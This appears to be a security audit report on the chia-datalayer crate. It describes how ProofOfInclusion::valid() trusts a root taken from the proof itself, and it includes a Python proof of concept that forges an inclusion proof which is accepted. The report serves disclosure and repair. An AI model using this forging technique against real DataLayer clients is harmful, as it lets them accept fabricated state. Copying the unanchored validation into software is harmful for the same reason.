### Title
`ProofOfInclusion::valid()` Does Not Verify Against a Trusted Root — Forged Inclusion Proof Accepted - (File: `crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`)

### Summary

`ProofOfInclusion::valid()` only checks internal hash-chain consistency within the proof itself. It derives its own `root_hash()` from the last `combined_hash` field embedded in the proof's layers, and then checks `existing_hash == self.root_hash()`. Because the root is read from the proof rather than supplied by the verifier, any attacker-crafted, internally-consistent `ProofOfInclusion` will return `true` from `valid()` regardless of whether it corresponds to the actual DataLayer tree root. This is the direct analog of the Juiced audit finding: the protocol accepted an attacker-supplied account without verifying it matched the known authoritative address.

### Finding Description

`ProofOfInclusion` is a `Streamable` struct exposed via Python bindings with `from_bytes`, `from_bytes_unchecked`, and a public constructor. Its `valid()` method is:

```rust
pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }
    existing_hash == self.root_hash()  // root_hash() reads from self.layers.last().combined_hash
}
```

`root_hash()` is:

```rust
pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() {
        last.combined_hash   // attacker-controlled field
    } else {
        self.node_hash       // attacker-controlled field
    }
}
```

The final check `existing_hash == self.root_hash()` is a tautology: `existing_hash` was just set to `calculated_hash` which was already verified to equal `layer.combined_hash` in the loop, and `root_hash()` returns that same `combined_hash`. An attacker constructs a `ProofOfInclusion` with an arbitrary `node_hash` (claiming any key-value pair exists) and a single layer whose `other_hash`, `other_hash_side`, and `combined_hash` are chosen to be internally consistent. `valid()` returns `true`. No external trusted root is ever consulted.

By contrast, the lower-level `validate_merkle_proof()` in `crates/chia-consensus/src/merkle_tree.rs` correctly takes an external `root: &[u8; 32]` parameter and rejects proofs whose computed root does not match:

```rust
pub fn validate_merkle_proof(proof: &[u8], item: &[u8; 32], root: &[u8; 32]) -> Result<bool, SetError> {
    let tree = MerkleSet::from_proof(proof)?;
    if tree.get_root() != *root {
        return Err(SetError);
    }
    Ok(tree.generate_proof(item)?.0)
}
```

`ProofOfInclusion::valid()` has no equivalent constraint.

### Impact Explanation

An attacker who can deliver a serialized `ProofOfInclusion` to any DataLayer consumer (Python application, wallet, light client) that calls `proof.valid()` can prove the existence of an arbitrary key-value pair in a DataLayer tree without that pair actually being present. This allows forged state proofs: a DataLayer client that relies on `valid()` to gate trust decisions (e.g., confirming a data commitment, verifying a key's value before acting on it) will accept fabricated inclusion claims. This matches the allowed High impact: **DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion, corrupts tree roots, or lets untrusted input prove invalid state.**

### Likelihood Explanation

`ProofOfInclusion` is a `Streamable` type with `from_bytes` and a public Python constructor exposed via `pyclass(get_all, from_py_object)`. Any Python code path that receives a `ProofOfInclusion` from an untrusted source (network peer, RPC response, serialized blob) and calls `valid()` is directly exploitable. The method name `valid()` implies complete validation, making misuse highly likely. No privileged access, key material, or chain-level manipulation is required.

### Recommendation

`valid()` must accept an externally-supplied trusted root and verify against it:

```rust
pub fn valid_for_root(&self, expected_root: &Hash) -> bool {
    // ... existing chain check ...
    existing_hash == *expected_root
}
```

Alternatively, rename the current method to `internally_consistent()` to make clear it does not anchor to any trusted root, and add a separate `valid_for_root(expected_root: &Hash) -> bool` that performs the complete check. The Python binding should expose only the root-anchored variant.

### Proof of Concept

```python
from chia_rs.datalayer import ProofOfInclusion, ProofOfInclusionLayer
from chia_rs.sized_bytes import bytes32
import hashlib

# Attacker chooses an arbitrary fake node_hash (claiming key X is in the tree)
fake_node_hash = bytes32(b'\xde\xad' * 16)
fake_other_hash = bytes32(b'\xbe\xef' * 16)

# Compute a combined_hash that is internally consistent with the above
# (side=0 means fake_node_hash is left child)
combined = hashlib.sha256(b'\x02' + fake_node_hash + fake_other_hash).digest()
fake_combined_hash = bytes32(combined)

layer = ProofOfInclusionLayer(
    other_hash_side=0,          # attacker-chosen
    other_hash=fake_other_hash, # attacker-chosen
    combined_hash=fake_combined_hash,  # derived to be consistent
)

forged_proof = ProofOfInclusion(node_hash=fake_node_hash, layers=[layer])

# valid() returns True for a completely fabricated proof
assert forged_proof.valid(), "Forged proof accepted!"
# root_hash() returns the attacker-controlled combined_hash, not any real tree root
print("Forged root:", forged_proof.root_hash().hex())
```
